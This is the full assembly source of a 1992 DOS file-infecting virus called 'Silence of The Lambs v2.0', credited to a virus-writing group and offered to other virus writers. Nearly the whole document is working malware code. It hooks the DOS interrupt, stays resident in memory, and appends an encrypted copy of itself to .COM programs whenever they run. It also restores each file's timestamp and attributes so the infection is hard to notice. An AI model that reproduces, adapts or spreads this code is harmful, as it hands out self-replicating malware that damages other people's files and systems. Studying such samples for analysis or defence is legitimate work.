;                            Silence of The Lambs v2.0
;                (c) -=<: DRE/\MER :>=- of Demoralized Youth 1992
;
;                   THIS FILE IS FOR EDUCATION PURPOSES ONLY!
;                  PERMISSION IS GRANTED TO SPREAD THE SOURCE
;                  TO VIRUS WRITERS *ONLY*. PLEASE DO NOT MAKE
;                  ANY MODIFYCATIONS, UNLESS YOU ALSO INCLUDE
;                             THE ORIGINAL SOURCE.
;
;                               Assemble With A86
;

org     100h
jmp short dummy1
db      'DY'
dummy1:
        mov     cx,length
        mov     si,offset enc_start
        mov     ah,0
enc_key         equ $-1
dummy2:
        sub     byte [si],ah
        inc     si
        add     ah,0
enc_add         equ $-1
        loop    dummy2
enc_start:
        mov     ah,2Dh
        mov     ch,0FFh
        mov     dx,cx
        int     21h
        cmp     al,0FFh
        jne     nomore

        mov     ax,cs
        dec     ax
        mov     ds,ax
        cmp     byte [0],'Z'
        jne     nomore

        mov     ax,word [3]
        sub     ax,pgfsize
        jc      nomore
        sub     word [3],pgfsize
        sub     word [12h],pgfsize

        mov     es,word [12h]
        mov     si,110h
        mov     di,100h
        mov     cx,total
        cld
        rep     movsb

        xor     ax,ax
        mov     ds,ax
        mov     si,84h
        mov     di,old21
        movsw
        movsw

        cli
        mov     word [84h+2],es
        mov     word [84h],offset ni21
        sti

nomore:
        push    cs
        push    cs
        pop     es
        pop     ds

        mov     bx,0000h                        ;return control to the
eof     equ $-2                                 ;end user
        jmp     bx

xclose:         jmp     close

infect:
        push    cs
        pop     ds
        push    cs
        pop     es

        db      0E4h,40h
        mov     byte [enc_key],al

        mov     ax,4300h                        ;use CHMOD to get file attr
        xor     dx,dx
        int     21h

        mov     [0F0h],cx                       ;store attr in PSP

        mov     ax,4301h                        ;clear file attr with CHMOD
        xor     cx,cx
        int     21h

        mov     ax,3D02h                        ;open file for read / write
        int     21h
        xchg    bx,ax
        lahf
        push    ax
        mov     ax,5700h                        ;get file date & time
        int     21h

        mov     [0F2h],cx
        mov     [0F4h],dx
        pop     ax
        sahf
        jc      xclose

        mov     ah,3Fh                          ;read from file
        mov     cx,total
        mov     dx,old
        int     21h

        cmp     byte [old+0],'M'   ;exe MZ ?
        je      xclose
        cmp     byte [old+0],'Z'   ;exe ZM ?
        je      xclose
        cmp     word [old+2],'YD'   ;allready infected?
        je      xclose

        mov     ax,4202h                        ;lseek to EOF
        xor     cx,cx
        xor     dx,dx
        int     21h

        cmp     ah,0FAh
        jae     xclose
        cmp     ah,4
        jb      xclose

        add     ax,total+100h
        mov     word [00F6h],ax

        mov     ah,40h                          ;write to EOF
        mov     cx,total
        mov     dx,old

push    cx
mov     al,byte [enc_key]
mov     si,dx
enc_app:
xor     byte [si],al
inc     si
loop    enc_app
pop     cx

        int     21h

        mov     ah,40h                          ;write to EOF
        mov     cx,applen
        mov     dx,offset append
        int     21h

        mov     ax,4200h                        ;lseek to beginning of file
        xor     cx,cx
        xor     dx,dx
        int     21h

        push    [eof]
        mov     ax,word [00F6h]
        mov     [eof],ax

        mov     ah,byte [enc_key]
        db      0E4h,40h
        mov     byte [enc_add],al
        mov     dl,al

        mov     si,100h
        mov     di,old

        cld
        mov     cx,offset enc_start-100h
        rep     movsb

        mov     cx,length
enc:
        lodsb
        add     al,ah
        stosb
        add     ah,dl
        loop    enc

        mov     ah,40h                          ;write viral code
        mov     dx,old
        mov     cx,total
        int     21h

        pop     [eof]
close:
        mov     ax,5701h
        mov     cx,[00F2h]
        mov     dx,[00F4h]
        int     21h

        mov     ah,3Eh                          ;close file
        int     21h

        mov     ax,4301h
        mov     cx,[00F0h]
        xor     dx,dx
        int     21h
        ret

append:
        call    $+3             ;replace org bytes
        pop     si
        sub     si,3+total
        mov     di,100h
        mov     cx,total
        mov     ah,byte [enc_key]
append_enc:
        lodsb
        xor     al,ah
        stosb
        loop    append_enc

        mov     ax,100h         ;return IP to 100h when done
        push    ax

        sub     ax,ax           ;zero regs
        xor     bx,bx
        and     cx,cx
        sub     dx,dx
        xor     si,si
        and     di,di
        sub     bp,bp

        ret
applen  equ $-offset append

ni21:
        pushf
        cmp     ah,2Dh
        jne     Not_Time
        cmp     ch,0FFh
        jne     Not_Time
        cmp     ch,dh
        jne     Not_time

        mov     Al,0
        popf
        iret
Not_Time:
        cld
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    bp
        push    es
        push    ds

;       cmp     ah,41h
;       jne     Not_Parse
;       mov     ah,3Ch
;       cli
;       add     sp,18
;       sti
;       popf
;       jmp     old21-1

Not_Parse:
        cmp     ax,4B00h
        jne     Not_Exec

        mov     si,dx
        push    cs
        pop     es
        xor     di,di
        mov     cx,128
        rep     movsb

        mov     ax,3524h
        int     21h
        push    es
        push    bx

        push    cs
        pop     ds

        mov     ax,2524h
        mov     dx,offset ni24
        int     21h

        call    infect

        pop     dx
        pop     ds
        mov     ax,2524h
        int     21h

Not_Exec:
        pop     ds
        pop     es
        pop     bp
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        popf
        jmp     far     0000:0000
old21   equ $-4

ni24:   mov al,0
        iret

db      'The Silence Of The Lambs!$'

total   equ $-100h                      ;size
pgfsize equ (($*2)/16)+2
length  equ $-offset enc_start

old     equ $


